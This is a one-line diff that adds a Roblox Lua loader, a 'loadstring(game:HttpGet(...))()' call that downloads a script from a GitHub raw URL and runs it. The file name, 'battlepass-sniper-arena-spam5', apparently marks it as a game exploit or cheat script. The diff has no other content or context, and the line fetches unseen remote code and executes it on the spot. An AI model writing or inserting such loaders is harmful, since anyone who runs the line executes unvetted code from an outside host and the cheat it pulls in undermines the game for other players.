@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/battlepass-sniper-arena-spam5-q5tpeafyewn1wt.lua"))()
